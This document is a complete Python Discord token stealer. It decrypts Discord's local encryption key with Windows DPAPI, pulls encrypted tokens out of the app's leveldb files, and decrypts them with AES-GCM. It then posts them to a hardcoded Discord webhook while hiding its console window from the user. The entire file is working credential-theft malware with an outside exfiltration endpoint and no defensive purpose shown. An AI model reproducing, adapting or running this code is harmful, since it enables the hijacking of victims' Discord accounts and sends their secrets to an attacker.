import os
import json
import base64
import re
import win32crypt
from Crypto.Cipher import AES
import requests
import ctypes
import sys

WEBHOOK_URL = "https://discord.com/api/webhooks/1485016223958827178/M3UzQH8pqvwaJYJe8lnL8CCMR5s6w-An6Sl4BzLaND9q3Enu5TsNZlUSfDuaORVMs82s"


def get_encryption_key():
    try:
        p = os.path.expandvars(r'%APPDATA%\discord\Local State')
        with open(p, 'r', encoding='utf-8') as f:
            j = json.load(f)
        
        encrypted_key = j['os_crypt']['encrypted_key']
        encrypted_key = base64.b64decode(encrypted_key)[5:]  # Remove DPAPI prefix
        
        key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return key
    except:
        return None


def decrypt_payload(ciphertext, key):
    try:
        nonce = ciphertext[3:15]
        ci = AES.new(key, AES.MODE_GCM, nonce=nonce)
        decrypted = ci.decrypt_and_verify(ciphertext[15:-16], ciphertext[-16:])
        return decrypted.decode('utf-8')
    except:
        return ""


def find_tokens(path, key):
    tokens = []
    regex = re.compile(rb'dQw4w9WgXcQ:[^"]*')
    
    for file in os.listdir(path):
        if not file.endswith(('.log', '.ldb')):
            continue
            
        try:
            with open(os.path.join(path, file), 'rb') as f:
                data = f.read()
                
            for match in regex.findall(data):
                try:
                    token = decrypt_payload(
                        base64.b64decode(match[len(b'dQw4w9WgXcQ:'):]), 
                        key
                    )
                    
                    # Basic validation: Discord tokens have 3 parts separated by '.'
                    if token and len(token.split('.')) == 3:
                        tokens.append(token)
                except:
                    continue
        except:
            continue
            
    return tokens


def send_to_webhook(tokens):
    if not tokens:
        return
    
    try:
        requests.post(
            WEBHOOK_URL,
            json={
                "content": "**Tokens Discord :**\n" + "\n".join(tokens)
            }
        )
    except:
        pass


# ==================== MAIN ====================
if __name__ == "__main__":
    # Hide console window on Windows
    if sys.platform == "win32":
        try:
            ctypes.windll.user32.ShowWindow(
                ctypes.windll.kernel32.GetConsoleWindow(), 0
            )
        except:
            pass

    p = os.path.expandvars(r'%APPDATA%\discord\Local Storage\leveldb')
    
    if not os.path.exists(p):
        sys.exit()

    k = get_encryption_key()
    if not k:
        sys.exit()

    # Extract tokens → remove duplicates → send
    tokens = list(set(find_tokens(p, k)))
    send_to_webhook(tokens)
